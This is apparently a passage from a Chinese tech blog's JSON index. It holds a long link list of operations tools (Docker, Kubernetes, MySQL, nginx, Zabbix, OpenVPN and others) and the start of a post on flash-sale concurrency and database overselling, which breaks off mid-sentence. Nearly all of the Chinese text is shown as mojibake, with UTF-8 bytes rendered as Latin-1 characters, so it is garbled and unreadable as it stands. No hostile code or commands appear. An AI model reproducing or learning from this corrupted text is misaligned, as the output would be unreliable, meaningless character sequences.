webå®¢æˆ·ç«¯ vsphere webå®¢æˆ·ç«¯ä¸‹è½½ vSphere Clientä¸‹è½½ KVM å®¹å™¨å¹³å°Docker Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼Œè®©å¼€å‘è€…å¯ä»¥æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªå¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„ Linux æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚ Rocket Rocket ï¼ˆä¹Ÿå« rktï¼‰æ˜¯ CoreOS æ¨å‡ºçš„ä¸€æ¬¾å®¹å™¨å¼•æ“ï¼Œå’Œ Docker ç±»ä¼¼ï¼Œå¸®åŠ©å¼€å‘è€…æ‰“åŒ…åº”ç”¨å’Œä¾èµ–åŒ…åˆ°å¯ç§»æ¤å®¹å™¨ä¸­ï¼Œç®€åŒ–æ­ç¯å¢ƒç­‰éƒ¨ç½²å·¥ä½œã€‚ Ubuntuï¼ˆLXCï¼‰ LXD æ˜¯ ubuntu åŸºäº LXC æŠ€æœ¯çš„é‡æ„ï¼Œå®¹å™¨å¤©ç„¶æ”¯æŒéç‰¹æƒå’Œåˆ†å¸ƒå¼ã€‚LXD ä¸ Docker çš„æ€è·¯ä¸åŒï¼ŒDocker æ˜¯ PAASï¼ŒLXD æ˜¯ IAASã€‚LXC é¡¹ç›®ç”±ä¸€ä¸ª Linux å†…æ ¸è¡¥ä¸å’Œä¸€äº› userspace å·¥å…·ç»„æˆã€‚è¿™äº› userspace å·¥å…·ä½¿ç”¨ç”±è¡¥ä¸å¢åŠ çš„å†…æ ¸æ–°ç‰¹æ€§ï¼Œæä¾›ä¸€å¥—ç®€åŒ–çš„å·¥å…·æ¥ç»´æŠ¤å®¹å™¨ã€‚ å¾®æœåŠ¡å¹³å°OpenShift OpenShift æ˜¯ç”±çº¢å¸½æ¨å‡ºçš„ä¸€æ¬¾é¢å‘å¼€æºå¼€å‘äººå‘˜å¼€æ”¾çš„å¹³å°å³æœåŠ¡(PaaS)ã€‚ OpenShifté€šè¿‡ä¸ºå¼€å‘äººå‘˜æä¾›åœ¨è¯­è¨€ã€æ¡†æ¶å’Œäº‘ä¸Šçš„æ›´å¤šçš„é€‰æ‹©ï¼Œä½¿å¼€å‘äººå‘˜å¯ä»¥æ„å»ºã€æµ‹è¯•ã€è¿è¡Œå’Œç®¡ç†ä»–ä»¬çš„åº”ç”¨ã€‚ Cloud Foundry Cloud Foundry æ˜¯VMwareäº2011å¹´4æœˆ12æ—¥æ¨å‡ºçš„ä¸šç•Œç¬¬ä¸€ä¸ªå¼€æºPaaSäº‘å¹³å°ï¼Œå®ƒæ”¯æŒå¤šç§æ¡†æ¶ã€è¯­è¨€ã€è¿è¡Œæ—¶ç¯å¢ƒã€äº‘å¹³å°åŠåº”ç”¨æœåŠ¡ï¼Œä½¿å¼€å‘ äººå‘˜èƒ½å¤Ÿåœ¨å‡ ç§’é’Ÿå†…è¿›è¡Œåº”ç”¨ç¨‹åºçš„éƒ¨ç½²å’Œæ‰©å±•ï¼Œæ— éœ€æ‹…å¿ƒä»»ä½•åŸºç¡€æ¶æ„çš„é—®é¢˜ã€‚ Kubernetes Kubernetes æ˜¯æ¥è‡ª Google äº‘å¹³å°çš„å¼€æºå®¹å™¨é›†ç¾¤ç®¡ç†ç³»ç»Ÿã€‚åŸºäº Docker æ„å»ºä¸€ä¸ªå®¹å™¨çš„è°ƒåº¦æœåŠ¡ã€‚è¯¥ç³»ç»Ÿå¯ä»¥è‡ªåŠ¨åœ¨ä¸€ä¸ªå®¹å™¨é›†ç¾¤ä¸­é€‰æ‹©ä¸€ä¸ªå·¥ä½œå®¹å™¨ä¾›ä½¿ç”¨ã€‚å…¶æ ¸å¿ƒæ¦‚å¿µæ˜¯ Container Podã€‚ Mesosphere Apache Mesos æ˜¯ä¸€ä¸ªé›†ç¾¤ç®¡ç†å™¨ï¼Œæä¾›äº†æœ‰æ•ˆçš„ã€è·¨åˆ†å¸ƒå¼åº”ç”¨æˆ–æ¡†æ¶çš„èµ„æºéš”ç¦»å’Œå…±äº«ï¼Œå¯ä»¥è¿è¡ŒHadoopã€MPIã€Hypertableã€Sparkã€‚ æ•°æ®åº“MySQL mysql æ•™ç¨‹ MySQLå®˜æ–¹è½¯ä»¶åŒ…ä¸‹è½½åœ°å€ MySQLä¸»ä»é…ç½®æ–‡æ¡£ MySQLä¸»ä»å¤åˆ¶(Master-Slave)ä¸è¯»å†™åˆ†ç¦»ï¼ˆMySQL-Proxyï¼‰å®è·µ Mysqlæ¶æ„çš„æ¼”åŒ– mongodb MongoDBå¿«é€Ÿå…¥é—¨ MongoDB æ•™ç¨‹ å®‰è£…é…ç½®MongoDB MongoDBå®‰è£…åŒ…å®˜ç½‘åœ°å€ ç¬¬1ç«  MongoDBçš„å®‰è£… ç¬¬2ç«  MongoDBçš„å¢åˆ æ”¹æŸ¥ ç¬¬3ç«  MongoDBçš„Javaé©±åŠ¨ Robomongo å®˜ç½‘ MongoDBçš„ä¸€ä¸ªå®¢æˆ·ç«¯GUIå·¥å…· ä¸‹è½½åœ°å€ äº‘â˜ï¸æœåŠ¡CDN CDNæµ‹è¯•æ’è¡Œ CDNå˜åŒ– ç½‘ç«™æµ‹é€Ÿ OpenStack æ¯å¤©5åˆ†é’Ÿç©è½¬ OpenStack Red Hat Enterprise Linuxå’ŒCentOSçš„OpenStackå®‰è£…æŒ‡å— å¦‚ä½•ä½¿ç”¨OpenStackå‘½ä»¤è¡Œå·¥å…·ç®¡ç†è™šæ‹Ÿæœº å¤§æ•°æ®è¿ç»´HBase é›†ç¾¤å®‰è£…éƒ¨ç½² HBase é›†ç¾¤å®‰è£…éƒ¨ç½² ç¼–ç¨‹scriptshell shellå­¦ä¹ ç½‘ç«™ Linuxå‘½ä»¤å¤§å…¨ Python python å­¦ä¹ è§†é¢‘ Python å…¥é—¨æŒ‡å— Pythoné¢è¯•é¢˜ pythonä¸­æ–‡å¤§æœ¬è¥ bandersnatch pip æ„å»ºå¿«é€Ÿéƒ¨ç½²çš„python pipç¯å¢ƒåŠpypiæœ¬åœ°æºç¯å¢ƒ CentOS 6.5 PYPIæœ¬åœ°æºåˆ¶ä½œ WebæœåŠ¡NGINX nginx æ•™ç¨‹ å›¾è§£httpåè®® nginx é…ç½®å…¥é—¨ nginx å…¥é—¨2 nginx ä¼˜åŒ– nginx ä¼˜åŒ–2 nginx yumå®‰è£… è„šæœ¬ä¸‹è½½åœ°å€ tomcat JAVAä¼ä¸šçº§åº”ç”¨TOMCATå®æˆ˜ tomcat é›†ç¾¤ tomcat ç›‘æ§ jvm è°ƒä¼˜ è´Ÿè½½å‡è¡¡ LVS é›†ç¾¤è´Ÿè½½å‡è¡¡å®æˆ˜ å¼€æºçš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»ŸGit gitæ•™ç¨‹ Gitlab gitlabå®˜ç½‘ mailzimbra Centos6.2ä¸‹å®‰è£…zimbra 7.2 zimbra è‡ªåŠ¨åŒ–è¿ç»´ansible Ansible æä¾›ä¸€ç§æœ€ç®€å•çš„æ–¹å¼ç”¨äºå‘å¸ƒã€ç®¡ç†å’Œç¼–æ’è®¡ç®—æœºç³»ç»Ÿçš„å·¥å…·ï¼Œä½ å¯åœ¨æ•°åˆ†é’Ÿå†…æå®šã€‚Ansible æ˜¯ä¸€ä¸ªæ¨¡å‹é©±åŠ¨çš„é…ç½®ç®¡ç†å™¨ï¼Œæ”¯æŒå¤šèŠ‚ç‚¹å‘å¸ƒã€è¿œç¨‹ä»»åŠ¡æ‰§è¡Œã€‚é»˜è®¤ä½¿ç”¨ SSH è¿›è¡Œè¿œç¨‹è¿æ¥ã€‚æ— éœ€åœ¨è¢«ç®¡ç†èŠ‚ç‚¹ä¸Šå®‰è£…é™„åŠ è½¯ä»¶ï¼Œå¯ä½¿ç”¨å„ç§ç¼–ç¨‹è¯­è¨€è¿›è¡Œæ‰©å±•ã€‚ ansibleæŒ‡å— saltstack Saltstack å¯ä»¥çœ‹åšæ˜¯funcçš„å¢å¼ºç‰ˆ+Puppetçš„å¼±åŒ–ç‰ˆã€‚ä½¿ç”¨Pythonç¼–å†™ã€‚éå¸¸å¥½ç”¨,å¿«é€Ÿå¯ä»¥åŸºäºEPELéƒ¨ç½²ã€‚Salt æ˜¯ä¸€ä¸ªå¼€æºçš„å·¥å…·ç”¨æ¥ç®¡ç†ä½ çš„åŸºç¡€æ¶æ„ï¼Œå¯è½»æ¾ç®¡ç†æˆåƒä¸Šä¸‡å°æœåŠ¡å™¨ã€‚ saltstackæŒ‡å— saltå®˜ç½‘å…¥é—¨åŸºç¡€ saltä½¿ç”¨æ€»ç»“ åŸºäºSaltç®¡ç†iptablesé˜²ç«å¢™è§„åˆ™ Django åŸºç¡€æ•™ç¨‹ APPæŒç»­é›†æˆéƒ¨ç½²å¹³å°Jenkins enkinså®‰è£…é…ç½® jenkins å‘å¸ƒç³»ç»Ÿ jenkins rpm è½¯ä»¶åŒ… jenkinsç®€å•ä½¿ç”¨ Jenkinså°†é¡¹ç›®å‘é€åˆ°tomcat centos7å®‰è£…æ–‡æ¡£ CentOS å®‰è£… Jenkins æ—¥å¿—åˆ†æå¹³å°ELK Logstash Logstash æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºæ—¥å¿—ã€äº‹ä»¶çš„ä¼ è¾“ã€å¤„ç†ã€ç®¡ç†å’Œæœç´¢çš„å¹³å°ã€‚ä½ å¯ä»¥ç”¨å®ƒæ¥ç»Ÿä¸€å¯¹åº”ç”¨ç¨‹åºæ—¥å¿—è¿›è¡Œæ”¶é›†ç®¡ç†ï¼Œæä¾› Web æ¥å£ç”¨äºæŸ¥è¯¢å’Œç»Ÿè®¡ã€‚ ELK æ­å»ºæ—¥å¿—åˆ†æå¹³å° ELK ä¸­æ–‡æ‰§æŒ‡å— elk æ’ä»¶ç®¡ç† elk æ’ä»¶ä½¿ç”¨ elk è„šæœ¬ Graylog CentOS 7å®‰è£…é…ç½®Graylog Graylogâ€”â€”æ—¥å¿—èšåˆå·¥å…·ä¸­çš„åèµ·ä¹‹ç§€ Graylog å…¥é—¨åˆ°ç²¾é€šæ–‡æ¡£ å¼€æºç›‘æ§ï¼Œè­¦å‘Š&amp;åˆ†æzabbix zabbixå­¦ä¹ è®ºå› zabbixå…¥é—¨ zabbixä¼˜åŒ–webäº‹ä»¶æ‰“å¼€é€Ÿåº¦ zabbixç›‘æ§MySQL zabbixå®˜æ–¹æ¨¡å— grafana äºŒæ¬¡å¼€æºå®‰è£… grafana-zabbixæ’ä»¶-å®˜æ–¹ç½‘ç«™ grafanaæ¼”ç¤ºç«™ç‚¹ zabbixç›‘æ§è½¯ä»¶çš„ä½¿ç”¨æ’é”™ zabbixè½¯ä»¶åŒ…ä¸‹è½½åœ°å€ ä»€ä¹ˆ3.0.0çš„zabbixçš„æ–°åŠŸèƒ½ é€šè¿‡ZABBIX KVMç›‘æ§ ä¸ªäººgithubä¸Šé¢æœ‰æ•´ç†æ¯”è¾ƒè¯¦ç»†çš„ç›‘æ§æ–‡æ¡£ 1. zabbixé€šè¿‡jmxç›‘æ§tomcat 2. zabbixé€šè¿‡jmxç›‘æ§tomcat zabbixå®˜ç½‘æ¨¡æ¿ zabbixå¼€æºç›‘æ§åŒºåˆ« Nagiosã€cactiã€zabbixçš„å¯¹æ¯”ï¼Ÿ Nagios Nagios æ˜¯ä¸€ä¸ªç›‘è§†ç³»ç»Ÿè¿è¡ŒçŠ¶æ€å’Œç½‘ç»œä¿¡æ¯çš„ç›‘è§†ç³»ç»Ÿã€‚Nagiosèƒ½ç›‘è§†æ‰€æŒ‡å®šçš„æœ¬åœ°æˆ–è¿œç¨‹ä¸»æœºä»¥åŠæœåŠ¡ï¼ŒåŒæ—¶æä¾›å¼‚å¸¸é€šçŸ¥åŠŸèƒ½ç­‰ã€‚ Ganglia Ganglia æ˜¯ä¸€ä¸ªè·¨å¹³å°å¯æ‰©å±•çš„ï¼Œé«˜ æ€§èƒ½è®¡ç®—ç³»ç»Ÿä¸‹çš„åˆ†å¸ƒå¼ç›‘æ§ç³»ç»Ÿï¼Œå¦‚é›†ç¾¤å’Œç½‘æ ¼ã€‚å®ƒæ˜¯åŸºäºåˆ†å±‚è®¾è®¡ï¼Œå®ƒä½¿ç”¨å¹¿æ³›çš„æŠ€æœ¯ï¼Œå¦‚XMLæ•°æ®ä»£è¡¨ï¼Œä¾¿æºæ•°æ®ä¼ è¾“ï¼ŒRRDtoolç”¨äºæ•°æ®å­˜å‚¨å’Œå¯è§†åŒ–ã€‚ Graphite Graphite æ˜¯ä¸€ä¸ªç”¨äºé‡‡é›†ç½‘ç«™å®æ—¶ä¿¡æ¯å¹¶è¿›è¡Œç»Ÿè®¡çš„å¼€æºé¡¹ç›®ï¼Œå¯ç”¨äºé‡‡é›†å¤šç§ç½‘ç«™æœåŠ¡è¿è¡ŒçŠ¶æ€ä¿¡æ¯ã€‚GraphiteæœåŠ¡å¹³å‡æ¯åˆ†é’Ÿæœ‰4800æ¬¡æ›´æ–°æ“ä½œã€‚ Kibana Kibana æ˜¯ä¸€ä¸ªä¸º Logstash å’Œ ElasticSearch æä¾›çš„æ—¥å¿—åˆ†æçš„ Web æ¥å£ã€‚å¯ä½¿ç”¨å®ƒå¯¹æ—¥å¿—è¿›è¡Œé«˜æ•ˆçš„æœç´¢ã€å¯è§†åŒ–ã€åˆ†æç­‰å„ç§æ“ä½œã€‚ å›¢é˜ŸæŠ€æœ¯å¹³å°å’Œé¡¹ç›®ç®¡ç†å¹³å°&amp;æµ‹è¯•å¹³å°confluenceå›¢é˜Ÿé¡¹ç›®åä½œå¹³å° teambition confluence teambition å…¬å¸æŠ€æœ¯å›¢é˜Ÿå·¥ä½œè®°å½•è·Ÿè¸ªè¿­ä»£å¹³å° teambition jira-æ•æ·é¡¹ç›®ç®¡ç†å·¥å…· jira-æ•æ·é¡¹ç›®ç®¡ç†å·¥å…· åˆ›ä¸šå…¬å¸ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ ç¦…é“é¡¹ç›®ç®¡ç†è½¯ä»¶ APPæ¨å¹¿ç»Ÿè®¡æ•°æ®åˆ†æ talkingdata RAPæ˜¯ä¸€ä¸ªå¯è§†åŒ–æ¥å£ç®¡ç†å·¥å…· é€šè¿‡åˆ†ææ¥å£ç»“æ„ RAP æ¥å£ç®¡ç†å·¥å…· ç»Ÿä¸€çš„è´¦å·ç®¡ç†è®¤è¯å¹³å°openLDAP openldap éƒ¨ç½²1 openldap éƒ¨ç½²2 LDAP è®¤è¯ Samba+LDAP+LAMç®¡ç†å·¥å…·åº”ç”¨ è®©Sambaç”¨æˆ·é€šè¿‡WEBé¡µé¢ä¿®æ”¹å¯†ç  OpenLDAP + ProFTPD Install OpenLDAP and ProFTPD on Ubuntu 12.04 å…¬å¸VPNOpenVPN Server CentOS 6ä¸Šéƒ¨ç½²OpenVPN Server OpenVPN for CentOS centos å®‰è£…éƒ¨ç½²openvpn éƒ¨ç½²å‚è€ƒ openVPN Tunnelblickå·¥å…·ä¸‹è½½ ç¿»å¢™sshéš§é“ç¿»å¢™ sshéš§é“ç¿»å¢™ node.js åå° å¦‚ä½•å¸è½½node.js æµ·å¤–ä»£ç†æœåŠ¡å™¨å¹³å°æœåŠ¡å™¨ä¾›åº”å•† æœåŠ¡å™¨ Windowswindows é˜²ç«å¢™ Windows Server 2008ä¸Šçš„é˜²ç«å¢™é…ç½®è„šæœ¬ Windowsç³»ç»Ÿä¸­æ–‡æ¢è‹±æ–‡ Windows 7ä¸­æ–‡æ——èˆ°ç‰ˆä¸è‹±æ–‡ç‰ˆè‡ªç”±åˆ‡æ¢ æµ‹è¯• openstf stfç¯å¢ƒæ­å»º macaca è‡ªåŠ¨åŒ–æµ‹è¯• ç§»åŠ¨æ—¶ä»£çš„è‡ªåŠ¨åŒ– waråŒ…ä»“åº“Mavenç§æœnexus Centos åŸºç¡€å¼€å‘ç¯å¢ƒæ­å»ºä¹‹Mavenç§æœnexus wkhtmltox-HTMLæ•ˆæœè½¬PDFæ ¼å¼ å‚è€ƒæˆ‘åšå®¢çš„wkhtmltox åšå®¢Ghost å®˜æ–¹-Ghostå‡çº§æ–¹æ³• ä¸€é”®å®‰è£…Ghoståšå®¢ bitnami ä¸‹è½½ä¸€é”®å®‰è£…Ghostè„šæœ¬åŒ… vps å®‰è£… Ghost åšå®¢ç³»ç»Ÿè®°å½• 15ä¸ªå…è´¹çš„Ghoståšå®¢ä¸»é¢˜ æˆ‘è‡ªå·±æ•´ç†çš„Ghost 20ç§åšå®¢ä¸»é¢˜ Ghostä¸­æ–‡å®˜æ–¹ç‰ˆ Ghostè‹±æ–‡æ–‡æ¡£å®‰è£… Ghoståšå®¢å®‰è£…ï¼Œä½¿ç”¨ï¼Œæ›´æ–°ä¸€æ¡é¾™æ•™ç¨‹ - ä¸­æ–‡ç‰ˆåœ¨æˆ‘githubä¸Šé¢éƒ½æœ‰çš„ï¼Œæˆ‘å®‰è£…çš„æ˜¯7.0çš„ã€‚ Ghostä¿®æ”¹ç«¯å£æ–¹æ³•æ–‡æ¡£ Ghost20ç§ä¸»é¢˜ä¸»é¢˜åŒ…ä¸‹è½½ï¼šGhost20ç§ä¸»é¢˜åŒ… Ghost åšå®¢å®‰è£…ä¸­æ–‡å…¨æ”»ç•¥ Ghostä¸»é¢˜å˜æ›´ Wordpress å®˜ç½‘ ä¸­æ–‡å®˜ç½‘WordPress è®¿é—®æœ‰ç‚¹æ…¢ã€‚ éå¸¸æœ‰ç›Šçš„æˆ‘æ˜¯å‚è€ƒäº†å»ºç«™ç½‘ç«™æœ‰å¾ˆè¯¦ç»†è¯´Wordpass wordpasså¤§å­¦ Wordpressä¸‹è½½æ’ä»¶-ä¸­æ–‡ç½‘ç«™éå¸¸å¥½çš„ä¸€ä½åšä¸»å¾ˆè¯¦ç»†è®²äº†WordPressçš„å®‰è£…è¿‡ç¨‹å’Œä¸»é¢˜æ›´æ¢ï¼Œæ’ä»¶ä½¿ç”¨ç­‰ç­‰WordPresså…ˆç”Ÿ WordPress å¦‚ä½•æ­å»ºWordPressåšå®¢? é˜¿é‡Œäº‘è§†é¢‘-å¦‚ä½•åœ¨ECSä¸Šå¿«é€’æ­å»ºä¸€ä¸ªWordPressç«™ç‚¹ WordPresså…¥é—¨ ä¹‹ å®‰è£…ä¸»é¢˜å’Œæ’ä»¶ hexo è¿™ä¸ªæ˜¯æˆ‘ç°åœ¨çš„åšå®¢ç”¨çš„æ•ˆæœã€‚ ç½‘ä¸Šä¹¦åº—-éå¸¸ä¸é”™ packt å·²å­¦ä¹ è§†é¢‘Linux ä»0å¼€å§‹ä¸€æ­¥æ­¥å®æˆ˜æ·±å…¥å­¦ä¹ Linuxè¿ç»´è§†é¢‘è¯¾ç¨‹(ä¸‰) 2014-03-28 çœ‹å®Œ â€“ç°åœ¨è¿™éœ€è¦ä»˜è´¹ï¼Œæˆ‘å½“åˆçœ‹çš„æ—¶å€™å…è´¹çš„ï¼Œç»™ä½ ä»¬ä¸ªé“¾æ¥ è¶Šè¿‡å»ï¼šhttp://edu.51cto.com/lesson/id-11907.html MySQL ä¼ä¸šMysqlå®æˆ˜ç³»åˆ—å…¥é—¨ç¯‡ 2014å¹´3æœˆ5æ—¥çœ‹å®Œ Mysqlä»å…¥é—¨åˆ°ç²¾é€šè§†é¢‘æ•™ç¨‹ï¼ˆå…±29é›†ï¼‰ 2015å¹´11æœˆ3æ—¥çœ‹å®Œ è¿˜æœ‰äº›ç½‘ä¸Šåˆ†äº«çš„è§†é¢‘ï¼Œå­˜æ”¾åœ¨ç™¾åº¦äº‘ã€‚æœ‰æ•°æ®åº“ä¼˜åŒ–12ç¯‡è§†é¢‘ã€‚è¿˜æœ‰æ•°æ®åº“æ¶æ„ Docker å®æˆ˜ä¼ä¸šDockerè™šæ‹ŸåŒ–ç³»åˆ— 2016å¹´3æœˆ23æ—¥çœ‹å®Œ Python å­¦ä¼šPythonç¼–ç¨‹åŸºç¡€ç¯‡ 2016-02-13 å­¦å®Œ ç›‘æ§ ä¼ä¸šçº§é«˜çº§ç›‘æ§ç³»ç»Ÿcacti+nagiosã€é©¬å“¥linuxè§†é¢‘è¯¾ç¨‹ã€‘Zabbixç›‘æ§å¹³å°åº”ç”¨å®æˆ˜è§†é¢‘è¯¾ç¨‹ æ”¶è´¹ éœ€è¦å¯@æˆ‘ 2016-09-10 å­¦å®Œ UbuntuUbuntuä¸Šå¯ä½¿ç”¨çš„15ä¸ªæ¡Œé¢ç¯å¢ƒ å¾ˆæ—©å°±ç©è¿‡äº†ã€‚ Ubuntu isoé•œåƒä¸‹è½½åœ°å€ å¹³é¢è®¾è®¡PS Photoshopå­¦ä¹ æ•™ç¨‹ @@ é™†ç»­æ›´æ–° ~~ ï¼ˆUpdate time ï¼š2016ï¼š12ï¼š11ï¼‰","link":"/2016/03/15/è¿ç»´ç¬”è®°/ä¸ªäººè®°å½•ğŸ’¥-èµ°ä¸Šå…¨æ ˆè¿ç»´å·¥ç¨‹å¸ˆå­¦ä¹ ç¬”è®°/"},{"title":"å¦‚ä½•è§£å†³ç§’æ€çš„æ€§èƒ½é—®é¢˜å’Œå¾®ä¿¡æ¨å¹¿æ´»åŠ¨çš„è®¨è®º","text":"æœ€è¿‘ä¸šåŠ¡è¯•æ°´å¾®ä¿¡æŠ½å¥–æ´»åŠ¨ï¼Œå…¬å¸ç°åœ¨æ‰“ç®—æ¨å¹¿ä¸‹äº§å“ã€‚å¢åŠ äº›ç²‰ä¸é‡ ä¹‹å‰ç»å¸¸çœ‹åˆ°æ·˜å®çš„åŒè¡Œä»¬è®¨è®ºç§’æ€ï¼Œè®¨è®ºç”µå•†ï¼Œè¿™æ¬¡ç»ˆäºè½®åˆ°æˆ‘ä»¬è‡ªå·±ç†è®ºç»“åˆå®é™…ä¸€æ¬¡äº†ã€‚ psï¼šè¿›å…¥æ­£æ–‡å‰å…ˆè¯´ä¸€ç‚¹ä¸ªäººæ„Ÿå—ï¼Œä¹‹å‰çœ‹æ·˜å®çš„pptæ„Ÿè§‰éƒ½æ‡‚äº†ï¼Œç­‰åˆ°è‡ªå·±å‡ºè§£å†³æ–¹æ¡ˆçš„æ—¶å€™å‘ç°è¿˜æ˜¯æœ‰å¾ˆå¤šæƒ³ä¸åˆ°çš„åœ°æ–¹å…¶å®éƒ½æ²¡æ‡‚ï¼Œå†æ¬¡éªŒè¯äº†â€œç»†èŠ‚æ˜¯é­”é¬¼â€çš„ç†è®ºã€‚å¹¶ä¸”ä¸€ä¸ªäººçš„èƒ½åŠ›æœ‰é™ï¼Œåªæœ‰å¤§å®¶ä¸€èµ·è®¨è®ºæ‰èƒ½æƒ³çš„æ›´å‘¨å…¨ï¼Œæ›´ç»†è‡´ã€‚å¥½äº†ï¼Œé—²è¯å°‘è¯´ï¼Œä¸‹é¢è¿›å…¥æ­£æ–‡ã€‚ ä¸€ã€æŠ½å¥–æ´»åŠ¨å¸¦æ¥äº†ä»€ä¹ˆï¼Ÿå¾®ä¿¡ç§¯åˆ†å…‘æ¢ç°é‡‘æˆ–æŠ¢è´­æŠ½å¥–æ´»åŠ¨ä¸€èˆ¬ä¼šç»è¿‡ã€å…³æ³¨å…¬ä¼—å·ã€‘ã€åˆ†äº«æ´»åŠ¨è·å¾—ç§¯åˆ†ã€‘ã€ç§¯åˆ†å…‘æ¢ã€‘ã€æŠ½å¥–å®‰å…¨ç¯èŠ‚ã€‘è¿™3ä¸ªå¤§ç¯èŠ‚ï¼Œè€Œå…¶ä¸­ã€æŠ¢è®¢å•ã€‘è¿™ä¸ªç¯èŠ‚æ˜¯æœ€è€ƒéªŒä¸šåŠ¡æä¾›æ–¹çš„æŠ—å‹èƒ½åŠ›çš„ã€‚ ç§¯åˆ†å…‘æ¢ç¯èŠ‚ä¸€èˆ¬ä¼šå¸¦æ¥2ä¸ªé—®é¢˜ï¼š 1ã€é«˜å¹¶å‘ æ¯”è¾ƒç«çƒ­çš„æŠ½å¥–åœ¨çº¿äººæ•°éƒ½æ˜¯20wèµ·çš„ï¼Œå¦‚æ­¤ä¹‹é«˜çš„åœ¨çº¿äººæ•°å¯¹äºç½‘ç«™æ¶æ„ä»å‰åˆ°åéƒ½æ˜¯ä¸€ç§è€ƒéªŒã€‚ 2ã€æŠ½å¥–äººå‘˜è¿‡å¤š 3ã€ æŠ¢è®¢å• ä»»ä½•å•†å“éƒ½ä¼šæœ‰æ•°é‡ä¸Šé™ï¼Œå¦‚ä½•é¿å…æˆåŠŸä¸‹è®¢å•ä¹°åˆ°å•†å“çš„äººæ•°ä¸è¶…è¿‡å•†å“æ•°é‡çš„ä¸Šé™ï¼Œè¿™æ˜¯æ¯ä¸ªæŠ¢è´­æ´»åŠ¨éƒ½è¦é¢ä¸´çš„éš¾é¢˜ã€‚ äºŒã€å¦‚ä½•è§£å†³ï¼Ÿé¦–å…ˆï¼Œäº§å“è§£å†³æ–¹æ¡ˆæˆ‘ä»¬å°±ä¸äºˆè®¨è®ºäº†ã€‚æˆ‘ä»¬åªè®¨è®ºæŠ€æœ¯è§£å†³æ–¹æ¡ˆ 1ã€å‰ç«¯æ¶æ„ 12345678910111213141516171819202122é¢å¯¹é«˜å¹¶å‘çš„æŠ¢è´­æ´»åŠ¨ï¼Œå‰ç«¯å¸¸ç”¨çš„ä¸‰æ¿æ–§æ˜¯ã€æ‰©å®¹ã€‘ã€é™æ€åŒ–ã€‘ã€é™æµã€‘ Aï¼šæ‰©å®¹ åŠ æœºå™¨ï¼Œè¿™æ˜¯æœ€ç®€å•çš„æ–¹æ³•ï¼Œé€šè¿‡å¢åŠ å‰ç«¯æ± çš„æ•´ä½“æ‰¿è½½é‡æ¥æŠ—å³°å€¼ã€‚ è¿™é‡Œæˆ‘ä»¬éƒ½æ˜¯å¤šå°ä¸»ä»é›†ç¾¤å»è·‘ã€‚ Bï¼šé™æ€åŒ– å°†æ´»åŠ¨é¡µé¢ä¸Šçš„æ‰€æœ‰å¯ä»¥é™æ€çš„å…ƒç´ å…¨éƒ¨é™æ€åŒ–ï¼Œå¹¶å°½é‡å‡å°‘åŠ¨æ€å…ƒç´ ã€‚é€šè¿‡CDNæ¥æŠ—å³°å€¼ã€‚ è¿™é‡Œæˆ‘ä»¬éƒ½æ˜¯æŠŠå›¾ç‰‡é™æ€æ”¾åœ¨åˆæ‹äº‘å’Œé˜¿é‡Œäº‘ä¸Šé¢ã€‚ Cï¼šé™æµ ä¸€èˆ¬éƒ½ä¼šé‡‡ç”¨IPçº§åˆ«çš„é™æµï¼Œå³é’ˆå¯¹æŸä¸€ä¸ªIPï¼Œé™åˆ¶å•ä½æ—¶é—´å†…å‘èµ·è¯·æ±‚æ•°é‡ã€‚ æˆ–è€…æ´»åŠ¨å…¥å£çš„æ—¶å€™å¢åŠ æ¸¸æˆæˆ–è€…é—®é¢˜ç¯èŠ‚è¿›è¡Œæ¶ˆå³°æ“ä½œã€‚ æˆ‘ä»¬é‡‡ç”¨Nginxå‰é¢åšäº†åå‘ä»£ç†åé¢ä¼˜åŒ–nginxã€‚ Dï¼šæœ‰æŸæœåŠ¡ æœ€åä¸€æ‹›ï¼Œåœ¨æ¥è¿‘å‰ç«¯æ± æ‰¿è½½èƒ½åŠ›çš„æ°´ä½ä¸Šé™çš„æ—¶å€™ï¼Œéšæœºæ‹’ç»éƒ¨åˆ†è¯·æ±‚æ¥ä¿æŠ¤æ´»åŠ¨æ•´ä½“çš„å¯ç”¨æ€§ã€‚ 2ã€åç«¯æ¶æ„ é‚£ä¹ˆåç«¯çš„æ•°æ®åº“åœ¨é«˜å¹¶å‘å’Œè¶…å–ä¸‹ä¼šé‡åˆ°ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿä¸»è¦ä¼šæœ‰å¦‚ä¸‹3ä¸ªé—®é¢˜ï¼šï¼ˆä¸»è¦è®¨è®ºå†™çš„é—®é¢˜ï¼Œè¯»çš„é—®é¢˜é€šè¿‡å¢åŠ cacheå¯ä»¥å¾ˆå®¹æ˜“çš„è§£å†³ï¼‰ 1234567 Iï¼š é¦–å…ˆMySQLè‡ªèº«å¯¹äºé«˜å¹¶å‘çš„å¤„ç†æ€§èƒ½å°±ä¼šå‡ºç°é—®é¢˜ï¼Œä¸€èˆ¬æ¥è¯´ï¼ŒMySQLçš„å¤„ç†æ€§èƒ½ä¼šéšç€å¹¶å‘threadä¸Šå‡è€Œä¸Šå‡ï¼Œä½†æ˜¯åˆ°äº†ä¸€å®šçš„å¹¶å‘åº¦ä¹‹åä¼šå‡ºç°æ˜æ˜¾çš„æ‹ç‚¹ï¼Œä¹‹åä¸€è·¯ä¸‹é™ï¼Œæœ€ç»ˆç”šè‡³ä¼šæ¯”å•threadçš„æ€§èƒ½è¿˜è¦å·®ã€‚ IIï¼š å…¶æ¬¡ï¼Œè¶…å–çš„æ ¹ç»“åœ¨äºå‡åº“å­˜æ“ä½œæ˜¯ä¸€ä¸ªäº‹åŠ¡æ“ä½œï¼Œéœ€è¦å…ˆselectï¼Œç„¶åinsertï¼Œæœ€åupdate 